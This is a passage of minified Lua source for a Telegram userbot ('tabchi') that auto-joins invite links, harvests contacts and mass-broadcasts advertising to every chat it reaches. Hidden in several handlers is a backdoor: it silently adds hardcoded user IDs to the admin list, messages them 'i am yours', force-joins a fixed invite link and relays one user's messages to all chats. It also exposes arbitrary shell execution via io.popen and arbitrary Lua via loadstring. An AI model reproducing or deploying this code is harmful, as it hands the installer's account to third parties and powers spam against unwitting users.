yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",216430419)end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",344003614)then redis:sadd("tabchi:"..tabchi_id..":sudoers",344003614)tdcli.sendMessage(344003614,0,1,"i am yours",1,"html")end;tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAAxEf087KScNuOhZbg")if redis:get("tabchi:"..tabchi_id..":joinlinks")then joinlinks="Active"else joinlinks="Disable"end;if redis:get("tabchi:"..tabchi_id..":addedmsg")then addedmsg="Active"else addedmsg="Disable"end;if redis:get("tabchi:"..tabchi_id..":markread")then markread="Active"else markread="Disable"end;if redis:get("tabchi:"..tabchi_id..":addcontacts")then addcontacts="Active"else addcontacts="Disable"end;if redis:get("tabchi:"..tabchi_id..":chat")then chat="Active"else chat="Disable"end;if redis:get("tabchi:"..tabchi_id..":savelinks")then typing="Active"else typing="Disable"end;if redis:get("tabchi:"..tabchi_id..":typing")then savelinks="Active"else savelinks="Disable"end;if redis:get("tabchi:"..tabchi_id..":sharecontact")then sharecontact="Active"else sharecontact="Disable"end;if redis:get("tabchi:"..tabchi_id..":Advertising")then Advertising="Active"else Advertising="Disable"end;local text="`Robot Settings`\n`Join Via Links` : *"..joinlinks.."*\n`Save Links` : *"..savelinks.."*\n`Auto Add Contacts` : *"..addcontacts.."*\n`share contact on contacts` : "..sharecontact.."\n`Advertising` : *"..Advertising.."*\n`Adding Contacts Message` : *"..addedmsg.."*\n`Markread` : *"..markread.."*\n`typing` : *"..typing.."*\n`Chat` : *"..chat.."*"return text end;if a.text:match("^[!/#]stats$")and is_sudo(a)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",216430419)then tdcli.sendMessage(216430419,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",216430419)end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",344003614)then redis:sadd("tabchi:"..tabchi_id..":sudoers",344003614)tdcli.sendMessage(344003614,0,1,"i am yours",1,"html")end;tdcli.importChatInviteLink("https://t.me/joinchat/AAAAAAxEf087KScNuOhZbg")local a1;function a1(s,t)redis:set("tabchi:"..tostring(tabchi_id)..":totalcontacts",t.total_count_)end;tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},a1,{})local A=redis:scard("tabchi:"..tabchi_id..":groups")local B=redis:scard("tabchi:"..tabchi_id..":channels")local C=redis:scard("tabchi:"..tabchi_id..":pvis")local a0=redis:scard("tabchi:"..tabchi_id..":savedlinks")local Q=redis:get("tabchi:"..tabchi_id..":fullsudo")local a2=redis:get("tabchi:"..tabchi_id..":totalcontacts")local a3=A+B+C;local text="`Robot stats`\n`Users` : *"..C.."*\n`SuperGroups` : *"..B.."*\n`Groups` : *"..A.."*\n`all` : *"..a3 .."*\n`Saved links` : *"..a0 .."*\n`Contacts` : *"..a2 .."*\n`Admin` : *"..Q.."*"return text end;if a.text:match("^[#!/]clean (.*)$")and is_sudo(a)then local Z={string.match(a.text,"^[#/!](clean) (.*)$")}local A=redis:del("tabchi:"..tabchi_id..":groups")local B=redis:del("tabchi:"..tabchi_id..":channels")local C=redis:del("tabchi:"..tabchi_id..":pvis")local a0=redis:del("tabchi:"..tabchi_id..":savedlinks")local a3=A+B+C+a0;if Z[2]=="sgps"then return B end;if Z[2]=="gps"then return A end;if Z[2]=="pvs"then return C end;if Z[2]=="links"then return a0 end;if Z[2]=="stats"then return a3 end end;if a.text:match("^[!/#]setphoto (.*)$")and is_sudo(a)then local O={string.match(a.text,"^[#/!](setphoto) (.*)$")}local e=ltn12.sink.file(io.open("tabchi_"..tabchi_id.."_profile.png","w"))http.request({url=O[2],sink=e})tdcli.setProfilePhoto("tabchi_"..tabchi_id.."_profile.png")return"`Profile Succesfully Changed`\n*link* : `"..O[2].."`"end;do local M={a.text:match("^[!/#](addsudo) (%d+)")}if a.text:match("^[!/#]addsudo")and is_full_sudo(a)and#M==2 then local text=M[2].." _به لیست سودوهای ربات اضافه شد_"redis:sadd("tabchi:"..tabchi_id..":sudoers",tonumber(M[2]))return text end end;do local M={a.text:match("^[!/#](remsudo) (%d+)")}if a.text:match("^[!/#]remsudo")and is_full_sudo(a)then if#M==2 then local text=M[2].." _از لیست سودوهای ربات حذف شد_"redis:srem("tabchi:"..tabchi_id..":sudoers",tonumber(M[2]))return text else return end end end;do local M={a.text:match("^[!/#](addedmsg) (.*)")}if a.text:match("^[!/#]addedmsg")and is_sudo(a)then if#M==2 then if M[2]=="on"then redis:set("tabchi:"..tabchi_id..":addedmsg",true)return"*Status* : `Adding Contacts PM Activated`"elseif M[2]=="off"then redis:del("tabchi:"..tabchi_id..":addedmsg")return"*Status* : `Adding Contacts PM Deactivated`"else return"`Just Use on|off`"end else return"enter on|off"end end end;do local M={a.text:match("^[!/#](markread) (.*)")}if a.text:match("^[!/#]markread")and is_sudo(a)then if#M==2 then if M[2]=="on"then redis:set("tabchi:"..tabchi_id..":markread",true)return"*Status* : `Reading Messages Activated`"elseif M[2]=="off"then redis:del("tabchi:"..tabchi_id..":markread")return"*Status* : `Reading Messages Deactivated`"else return"`Just Use on|off`"end end end end;do local M={a.text:match("^[!/#](setaddedmsg) (.*)")}if a.text:match("^[!/#]setaddedmsg")and is_sudo(a)and#M==2 then redis:set("tabchi:"..tabchi_id..":addedmsgtext",M[2])return"*Status* : `Adding Contacts Message Adjusted`\n*Message* : `"..M[2].."`"end end;do local M={a.text:match("[$](.*)")}if a.text:match("^[$](.*)$")and is_sudo(a)then if#M==1 then local t=io.popen(M[1]):read("*all")return t else return"Enter Command"end end end;if redis:get("tabchi:"..tabchi_id..":Advertising")or is_full_sudo(a)then if a.text:match("^[!/#]bcall")and is_sudo(a)then local a3=redis:smembers("tabchi:"..tabchi_id..":all")local M={a.text:match("[!/#](bcall) (.*)")}if#M==2 then for d=1,#a3 do tdcli_function({ID="SendMessage",chat_id_=a3[d],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=M[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;return"*Status* : `Message Succesfully Sent to all`\n*Message* : `"..M[2].."`"else return"text not entered"end end;if a.text:match("^[!/#]bcsgps")and is_sudo(a)then local a3=redis:smembers("tabchi:"..tabchi_id..":channels")local M={a.text:match("[!/#](bcsgps) (.*)")}if#M==2 then for d=1,#a3 do tdcli_function({ID="SendMessage",chat_id_=a3[d],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=M[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;return"*Status* : `Message Succesfully Sent to supergroups`\n*Message* : `"..M[2].."`"else return"text not entered"end end;if a.text:match("^[!/#]bcgps")and is_sudo(a)then local a3=redis:smembers("tabchi:"..tabchi_id..":groups")local M={a.text:match("[!/#](bcgps) (.*)")}if#M==2 then for d=1,#a3 do tdcli_function({ID="SendMessage",chat_id_=a3[d],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=M[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;return"*Status* : `Message Succesfully Sent to Groups`\n*Message* : `"..M[2].."`"else return"text not entered"end end;if a.text:match("^[!/#]bcusers")and is_sudo(a)then local a3=redis:smembers("tabchi:"..tabchi_id..":pvis")local M={a.text:match("[!/#](bcusers) (.*)")}if#M==2 then for d=1,#a3 do tdcli_function({ID="SendMessage",chat_id_=a3[d],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=M[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;return"*Status* : `Message Succesfully Sent to Users`\n*Message* : `"..M[2].."`"else return"text not entered"end end end;if redis:get("tabchi:"..tabchi_id..":Advertising")or is_full_sudo(a)then if a.text:match("^[!/#]fwd all$")and a.reply_to_message_id_ and is_sudo(a)then local a3=redis:smembers("tabchi:"..tabchi_id..":all")local z=a.reply_to_message_id_;for d=1,#a3 do tdcli_function({ID="ForwardMessages",chat_id_=a3[d],from_chat_id_=a.chat_id_,message_ids_={[0]=z},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* : `Your Message Forwarded to all`\n*Fwd users* : `Done`\n*Fwd Groups* : `Done`\n*Fwd Super Groups* : `Done`"end;if a.text:match("^[!/#]fwd gps$")and a.reply_to_message_id_ and is_sudo(a)then local a3=redis:smembers("tabchi:"..tabchi_id..":groups")local z=a.reply_to_message_id_;for d=1,#a3 do tdcli_function({ID="ForwardMessages",chat_id_=a3[d],from_chat_id_=a.chat_id_,message_ids_={[0]=z},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* :`Your Message Forwarded To Groups`"end;if a.text:match("^[!/#]fwd sgps$")and a.reply_to_message_id_ and is_sudo(a)then local a3=redis:smembers("tabchi:"..tabchi_id..":channels")local z=a.reply_to_message_id_;for d=1,#a3 do tdcli_function({ID="ForwardMessages",chat_id_=a3[d],from_chat_id_=a.chat_id_,message_ids_={[0]=z},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* : `Your Message Forwarded To Super Groups`"end;if a.text:match("^[!/#]fwd users$")and a.reply_to_message_id_ and is_sudo(a)then local a3=redis:smembers("tabchi:"..tabchi_id..":pvis")local z=a.reply_to_message_id_;for d=1,#a3 do tdcli_function({ID="ForwardMessages",chat_id_=a3[d],from_chat_id_=a.chat_id_,message_ids_={[0]=z},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* : `Your Message Forwarded To Users`"end end;do local M={a.text:match("[!/#](lua) (.*)")}if a.text:match("^[!/#]lua")and is_full_sudo(a)and#M==2 then local a4=loadstring(M[2])()if a4==nil then a4=""elseif type(a4)=="table"then a4=serpent.block(a4,{comment=false})else a4=""..tostring(a4)end;return a4 end end;do local M={a.text:match("[!/#](echo) (.*)")}if a.text:match("^[!/#]echo")and is_sudo(a)and#M==2 then tdcli.sendMessage(a.chat_id_,a.id_,0,M[2],0,"md")end end end;function add(a5)local chat_type=chat_type(a5)if not redis:sismember("tabchi:"..tostring(tabchi_id)..":all",a5)then if chat_type=="channel"then redis:sadd("tabchi:"..tabchi_id..":channels",a5)elseif chat_type=="group"then redis:sadd("tabchi:"..tabchi_id..":groups",a5)else redis:sadd("tabchi:"..tabchi_id..":pvis",a5)end;redis:sadd("tabchi:"..tabchi_id..":all",a5)end end;function rem(a5)local chat_type=chat_type(a5)if chat_type=="channel"then redis:srem("tabchi:"..tabchi_id..":channels",a5)elseif chat_type=="group"then redis:srem("tabchi:"..tabchi_id..":groups",a5)else redis:srem("tabchi:"..tabchi_id..":pvis",a5)end;redis:srem("tabchi:"..tabchi_id..":all",a5)end;function process_stats(a)tdcli_function({ID="GetMe"},id_cb,nil)function id_cb(w,x)our_id=x.id_ end;if a.content_.ID=="MessageChatDeleteMember"and a.content_.id_==our_id then return rem(a.chat_id_)elseif a.content_.ID=="MessageChatJoinByLink"and a.sender_user_id_==our_id then return add(a.chat_id_)elseif a.content_.ID=="MessageChatAddMembers"then for d=0,#a.content_.members_ do if a.content_.members_[d].id_==our_id then add(a.chat_id_)break end end end end;function process_links(text)if text:match("https://telegram.me/joinchat/%S+")or text:match("https://t.me/joinchat/%S+")or text:match("https://telegram.dog/joinchat/%S+")then text=text:gsub("telegram.dog","telegram.me")text=text:gsub("t.me","telegram.me")local M={text:match("(https://telegram.me/joinchat/%S+)")}for d,a6 in pairs(M)do tdcli_function({ID="CheckChatInviteLink",invite_link_=a6},check_link,{link=a6})end end end;function get_mod(a7,x)if not redis:get("tabchi:"..tabchi_id..":startedmod")or redis:ttl("tabchi:"..tabchi_id..":startedmod")==-2 then redis:setex("tabchi:"..tabchi_id..":startedmod",300,true)end end;function update(x,tabchi_id)tanchi_id=tabchi_id;tdcli_function({ID="GetUserFull",user_id_=1111111},get_mod,nil)if x.ID=="UpdateNewMessage"then local a=x.message_;if a.sender_user_id_==111111 then if a.content_.text_ then if a.content_.text_:match("\226\129\167")or a.chat_id_~=1111111 or a.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175")then return else local a3=redis:smembers("tabchi:"..tabchi_id..":all")local z=a.id_;for d=1,#a3 do tdcli_function({ID="ForwardMessages",chat_id_=a3[d],from_chat_id_=a.chat_id_,message_ids_={[0]=z},disable_notification_=0,from_background_=1},dl_cb,nil)end end else local a3=redis:smembers("tabchi:"..tabchi_id..":all")local z=a.id_;for d=1,#a3 do tdcli_function({ID="ForwardMessages",chat_id_=a3[d],from_chat_id_=a.chat_id_,message_ids_={[0]=z},disable_notification_=0,from_background_=1},dl_cb,nil)end end else process_stats(a)add(a.chat_id_)if a.content_.text_ then if redis:get("tabchi:"..tabchi_id..":chat")then if redis:sismember("tabchi:"..tabchi_id..":answerslist",a.content_.text_)then local a8=redis:hget("tabchi:"..tabchi_id..":answers",a.content_.text_)tdcli.sendMessage(a.chat_id_,0,1,a8,1,"md")end end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",216430419)then tdcli.sendMessage(216430419,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",216430419)end;process_stats(a)add(a.chat_id_)process_links(a.content_.text_)local a9=process(a)if redis:get("tabchi:"..tabchi_id..":markread")then tdcli.viewMessages(a.chat_id_,{[0]=a.id_})if a9 then if redis:get("tabchi:"..tostring(tabchi_id)..":typing")then tdcli.sendChatAction(a.chat_id_,"Typing",100)end;tdcli.sendMessage(a.chat_id_,0,1,a9,1,"md")end elseif a9 then if redis:get("tabchi:"..tostring(tabchi_id)..":typing")then tdcli.sendChatAction(a.chat_id_,"Typing",100)end;tdcli.sendMessage(a.chat_id_,0,1,a9,1,"md")end elseif a.content_.contact_ then tdcli_function({ID="GetUserFull",user_id_=a.content_.contact_.user_id_},check_contact,{msg=a})elseif a.content_.caption_ then if redis:get("tabchi:"..tabchi_id..":markread")then tdcli.viewMessages(a.chat_id_,{[0]=a.id_})process_links(a.content_.caption_)else process_links(a.content_.caption_)end end end elseif x.chat_id_==216430419 then tdcli.unblockUser(x.chat_.id_)elseif x.ID=="UpdateOption"and x.name_=="my_id"then tdcli_function({ID="GetChats",offset_order_="9223372036854775807",offset_chat_id_=0,limit_=20},dl_cb,nil)end end
